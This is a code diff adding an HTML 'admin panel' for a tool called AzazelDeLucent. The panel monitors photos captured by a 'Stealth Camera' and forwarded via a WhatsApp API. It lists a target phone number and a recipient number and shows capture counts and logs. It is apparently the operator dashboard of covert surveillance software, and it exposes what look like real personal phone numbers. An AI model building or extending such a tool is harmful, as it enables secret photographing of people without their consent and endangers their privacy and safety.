@@ -1,1 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin - AzazelDeLucent</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            font-family: 'Share Tech Mono', monospace;
+            padding: 20px;
+            color: #ff4444;
+        }
+        .container { max-width: 800px; margin: 0 auto; }
+        h1 { color: #ff0000; text-shadow: 0 0 10px #ff0000; text-align: center; margin-bottom: 20px; letter-spacing: 4px; }
+        .stats {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px; margin-bottom: 20px;
+        }
+        .stat-box {
+            background: rgba(10,10,10,0.9); border: 1px solid #ff000066;
+            padding: 15px; text-align: center;
+        }
+        .stat-box .num { font-size: 2rem; color: #ff0000; text-shadow: 0 0 10px #ff0000; }
+        .stat-box .lbl { font-size: 0.7rem; color: #884444; margin-top: 5px; letter-spacing: 2px; }
 
+        .card {
+            background: rgba(10,10,10,0.9); border: 1px solid #ff000066;
+            padding: 20px; margin-bottom: 15px;
+        }
+        .card h3 { color: #ff4444; font-size: 0.85rem; letter-spacing: 2px; margin-bottom: 12px; border-bottom: 1px solid #ff000022; padding-bottom: 8px; }
+
+        table { width: 100%; border-collapse: collapse; font-size: 0.75rem; }
+        th { color: #ff4444; text-align: left; padding: 8px 5px; border-bottom: 1px solid #ff000044; letter-spacing: 2px; }
+        td { color: #aa6666; padding: 8px 5px; border-bottom: 1px solid #330000; }
+        .status-badge { display: inline-block; padding: 2px 8px; font-size: 0.65rem; border-radius: 2px; }
+        .status-badge.sent { background: #00ff0011; color: #00ff00; border: 1px solid #00ff00; }
+        .status-badge.pending { background: #ffff0011; color: #ffff00; border: 1px solid #ffff00; }
+        .status-badge.failed { background: #ff000011; color: #ff0000; border: 1px solid #ff0000; }
+
+        .log-box {
+            background: #050000; border: 1px solid #330000; padding: 10px;
+            max-height: 200px; overflow-y: auto; font-size: 0.7rem;
+        }
+        .log-box div { color: #884444; margin-bottom: 2px; }
+        .ts { color: #444; }
+
+        .btn {
+            background: transparent; border: 1px solid #ff000088; color: #ff4444;
+            padding: 8px 20px; font-family: 'Share Tech Mono', monospace; font-size: 0.8rem;
+            cursor: pointer; letter-spacing: 2px; transition: all 0.3s; text-transform: uppercase;
+        }
+        .btn:hover{background:#ff000022;border-color:#ff0000}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📊 ADMIN PANEL</h1>
+
+        <div class="stats">
+            <div class="stat-box">
+                <div class="num" id="total-captures">0</div>
+                <div class="lbl">TOTAL CAPTURES</div>
+            </div>
+            <div class="stat-box">
+                <div class="num" id="total-sent">0</div>
+                <div class="lbl">SENT TO WA</div>
+            </div>
+            <div class="stat-box">
+                <div class="num" id="active-sessions">1</div>
+                <div class="lbl">ACTIVE SESSIONS</div>
+            </div>
+            <div class="stat-box">
+                <div class="num" id="last-capture">-</div>
+                <div class="lbl">LAST CAPTURE</div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>◆ TARGET INFO ◆</h3>
+            <table>
+                <tr><th>Field</th><th>Value</th></tr>
+                <tr><td>Target Number</td><td>+62 878-7900-7194</td></tr>
+                <tr><td>Send To</td><td>+62 813-1668-3463</td></tr>
+                <tr><td>Bot Name</td><td>AzazelDeLucent</td></tr>
+                <tr><td>Protocol</td><td>Stealth Camera + WA API</td></tr>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>◆ CAPTURE LOG ◆</h3>
+            <table>
+                <thead>
+                    <tr><th>Time</th><th>Type</th><th>Size</th><th>Status</th></tr>
+                </thead>
+                <tbody id="log-table">
+                    <tr><td colspan="4" style="text-align:center;color:#664444;">No captures yet</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>◆ SYSTEM LOG ◆</h3>
+            <div class="log-box" id="syslog">
+                <div><span class="ts">[SYSTEM]</span> Admin panel loaded</div>
+                <div><span class="ts">[SYSTEM]</span> Monitoring local storage...</div>
+            </div>
+        </div>
+
+        <div style="text-align:center;margin-top:15px;">
+            <button class="btn" onclick="clearStorage()">🗑️ CLEAR DATA</button>
+            <button class="btn" onclick="location.href='../index.html'" style="margin-left:10px;">← MAIN PAGE</button>
+        </div>
+    </div>
+
+    <script>
+        const syslog = document.getElementById('syslog');
+        const logTable = document.getElementById('log-table');
+        const totalCaptures = document.getElementById('total-captures');
+        const totalSent = document.getElementById('total-sent');
+        const lastCapture = document.getElementById('last-capture');
+
+        function log(msg) {
+            const e = document.createElement('div');
+            const t = new Date().toTimeString().slice(0,8);
+            e.innerHTML = `<span class="ts">[${t}]</span> ${msg}`;
+            syslog.appendChild(e);
+            syslog.scrollTop = syslog.scrollHeight;
+        }
+
+        function updateStats() {
+            const photo = localStorage.getItem('azazel_last_photo');
+            const time = localStorage.getItem('azazel_photo_time');
+            const count = localStorage.getItem('azazel_capture_count') || '0';
+            
+            totalCaptures.textContent = count;
+            lastCapture.textContent = time ? new Date(time).toLocaleTimeString() : '-';
+            
+            if (photo) {
+                const size = Math.round(photo.length / 1024);
+                totalSent.textContent = '1';
+                
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${time ? new Date(time).toLocaleString() : 'Now'}</td>
+                    <td>Photo (JPEG)</td>
+                    <td>${size} KB</td>
+                    <td><span class="status-badge sent">READY</span></td>
+                `;
+                logTable.innerHTML = '';
+                logTable.appendChild(row);
+                log('Photo data detected in storage', 'ok');
+            }
+        }
+
+        function clearStorage() {
+            localStorage.removeItem('azazel_last_photo');
+            localStorage.removeItem('azazel_photo_time');
+            localStorage.removeItem('azazel_target_number');
+            localStorage.removeItem('azazel_capture_count');
+            log('🗑️ All data cleared');
+            updateStats();
+        }
+
+        // Listen for updates
+        window.addEventListener('storage', updateStats);
+        setInterval(updateStats, 3000);
+
+        // Init
+        updateStats();
+        log('Monitoring active — waiting for captures');
+        log('Target: +62 878-7900-7194 → +62 813-1668-3463');
+    </script>
+</body>
+</html>
